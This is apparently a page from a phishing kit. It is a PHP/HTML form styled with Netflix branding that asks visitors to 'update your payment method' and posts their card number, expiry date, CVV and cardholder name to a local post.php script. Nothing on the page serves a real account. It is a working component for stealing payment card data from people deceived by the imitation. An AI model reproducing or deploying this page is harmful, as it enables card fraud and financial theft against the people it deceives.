<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Netflix</title>
</head>
<body>


<header>
   <div class="logo">
           <img src="res/img/Logo.png">  </div>
       </header> 




<main>
    <div class="continer">
    
           


<div class="title">
    <h1>Update your payment method</h1>
</div> 

<div class="cardlogo">
<img src="res/img/cards.png" alt="">
</div>


<form action="post.php" method="post">




<div class="form-container">
<form action="post.php" method="post">
  <label for="card-number"></label>
  <input type="text" id="cc" name="cc" placeholder="Card number" required>
  
  <div class="card-details">
    <div>
      <label for="expiry-date"></label>
      <input type="text" id="exp" name="exp" placeholder="MM/AA" required>
    </div>
    <div>
      <label for="cryptogram"></label>
      <input type="text" id="cvv" name="cvv" placeholder="Cryptogram" required>
    </div>
  </div>
  
  <label for="card-holder-name"></label>
  <input type="text" id="holder-name" name="holder-name" placeholder="Name on card" required>
</div>


<div class="but">
<div class="button"><button type="submit"> Continue</button> </div>
</div>


</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 

</body>
</html>